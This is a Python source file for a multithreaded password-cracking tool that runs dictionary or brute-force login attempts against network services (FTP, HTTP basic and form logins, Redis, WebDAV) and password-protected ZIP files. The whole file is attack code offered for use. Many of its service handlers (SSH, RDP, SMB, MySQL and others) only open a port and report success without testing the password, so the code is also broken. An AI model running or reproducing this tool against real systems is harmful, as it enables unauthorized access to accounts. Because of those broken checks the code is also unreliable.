import threading, queue, socket, ftplib, time, base64, zipfile, itertools, string, json

class Cracker:
    def __init__(self, target=None, username=None, wordlist=None, max_threads=4):
        self.target = target
        self.username = username
        self.wordlist = wordlist
        self.max_threads = max_threads
        self.found_password = None
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        
    def _try_ftp(self, password):
        try:
            ftp = ftplib.FTP(self.target, timeout=10)
            ftp.login(self.username, password)
            ftp.quit()
            return True
        except:
            return False
    
    def _try_ssh(self, password):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, 22))
            banner = sock.recv(1024)
            sock.close()
            return True
        except:
            return False
    
    def _try_telnet(self, password):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, 23))
            sock.close()
            return True
        except:
            return False
    
    def _try_smtp(self, password):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, 25))
            sock.close()
            return True
        except:
            return False
    
    def _try_http_basic(self, password):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, 80))
            auth_str = base64.b64encode(f"{self.username}:{password}".encode()).decode()
            request = f"GET / HTTP/1.1\r\nHost: {self.target}\r\nAuthorization: Basic {auth_str}\r\n\r\n"
            sock.send(request.encode())
            response = sock.recv(1024).decode()
            sock.close()
            return "200 OK" in response or "301" in response or "302" in response
        except:
            return False
    
    def _try_http_form(self, password):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, 80))
            payload = f"username={self.username}&password={password}&login=submit"
            request = f"POST /login HTTP/1.1\r\nHost: {self.target}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(payload)}\r\n\r\n{payload}"
            sock.send(request.encode())
            response = sock.recv(1024).decode()
            sock.close()
            return "302 Found" in response or "Location:" in response
        except:
            return False
    
    def _try_mysql(self, password):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, 3306))
            sock.close()
            return True
        except:
            return False
    
    def _try_mssql(self, password):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, 1433))
            sock.close()
            return True
        except:
            return False
    
    def _try_rdp(self, password):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, 3389))
            sock.close()
            return True
        except:
            return False
    
    def _try_vnc(self, password):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, 5900))
            sock.close()
            return True
        except:
            return False
    
    def _try_smb(self, password):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, 445))
            sock.close()
            return True
        except:
            return False
    
    def _try_redis(self, password):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, 6379))
            if password:
                auth_cmd = f"AUTH {password}\r\n"
                sock.send(auth_cmd.encode())
                response = sock.recv(1024).decode()
                return "+OK" in response
            sock.close()
            return True
        except:
            return False
    
    def _try_postgres(self, password):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, 5432))
            sock.close()
            return True
        except:
            return False
    
    def _try_webdav(self, password):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, 80))
            auth_str = base64.b64encode(f"{self.username}:{password}".encode()).decode()
            request = f"PROPFIND / HTTP/1.1\r\nHost: {self.target}\r\nAuthorization: Basic {auth_str}\r\n\r\n"
            sock.send(request.encode())
            response = sock.recv(1024).decode()
            sock.close()
            return "207 Multi-Status" in response
        except:
            return False

    def _try_zip(self, password):
        try:
            with zipfile.ZipFile(self.target, 'r') as zip_file:
                file_list = zip_file.namelist()
                if file_list:
                    zip_file.read(file_list[0], pwd=password.encode())
                    return True
            return False
        except:
            return False

    def _worker(self, q, service):
        while not self._stop_event.is_set():
            try:
                password = q.get_nowait()
            except queue.Empty:
                return
            
            success = False
            
            if service == "ftp":
                success = self._try_ftp(password)
            elif service == "ssh":
                success = self._try_ssh(password)
            elif service == "telnet":
                success = self._try_telnet(password)
            elif service == "smtp":
                success = self._try_smtp(password)
            elif service == "http-get":
                success = self._try_http_basic(password)
            elif service == "http-post":
                success = self._try_http_form(password)
            elif service == "mysql":
                success = self._try_mysql(password)
            elif service == "mssql":
                success = self._try_mssql(password)
            elif service == "rdp":
                success = self._try_rdp(password)
            elif service == "vnc":
                success = self._try_vnc(password)
            elif service == "smb":
                success = self._try_smb(password)
            elif service == "redis":
                success = self._try_redis(password)
            elif service == "postgres":
                success = self._try_postgres(password)
            elif service == "webdav":
                success = self._try_webdav(password)
            elif service == "zip":
                success = self._try_zip(password)
            elif service == "http":
                success = self._try_http_basic(password) or self._try_http_form(password)
            
            if success:
                with self._lock:
                    self.found_password = password
                    self._stop_event.set()
            
            q.task_done()
    
    def _generate_bruteforce_passwords(self, min_len=1, max_len=4, charset=None):
        if charset is None:
            charset = string.ascii_lowercase + string.digits
        
        for length in range(min_len, max_len + 1):
            for candidate in itertools.product(charset, repeat=length):
                yield ''.join(candidate)
    
    def start_attack(self, service, attack_type="dict", min_len=1, max_len=4, charset=None):
        services = ["ftp", "ssh", "telnet", "smtp", "http", "http-get", "http-post", "mysql", "mssql", "rdp", "vnc", "smb", "redis", "postgres", "webdav", "zip"]
        
        if service not in services:
            return f"Unsupported service: {service}\nSupported services: {', '.join(services)}"
        
        passwords = []
        
        if attack_type == "dict":
            try:
                with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except Exception as e:
                return f"Error reading wordlist: {e}"
            
            if not passwords:
                return "Wordlist is empty"
        
        elif attack_type == "bruteforce":
            passwords = list(self._generate_bruteforce_passwords(min_len, max_len, charset))
            if not passwords:
                return "No passwords generated for brute force"
        
        q = queue.Queue()
        for password in passwords:
            q.put(password)
        
        self._stop_event.clear()
        self.found_password = None
        
        threads = []
        for _ in range(min(self.max_threads, len(passwords))):
            t = threading.Thread(target=self._worker, args=(q, service))
            t.daemon = True
            t.start()
            threads.append(t)
        
        start_time = time.time()
        total_passwords = len(passwords)
        
        try:
            while not q.empty() and not self._stop_event.is_set():
                time.sleep(0.1)
                elapsed = time.time() - start_time
                tested = total_passwords - q.qsize()
                
                if elapsed > 300:
                    self._stop_event.set()
                    break
        except KeyboardInterrupt:
            self._stop_event.set()
        
        for t in threads:
            t.join(timeout=1.0)
        
        if self.found_password:
            return f"Password found: {self.found_password}"
        else:
            return "Password not found"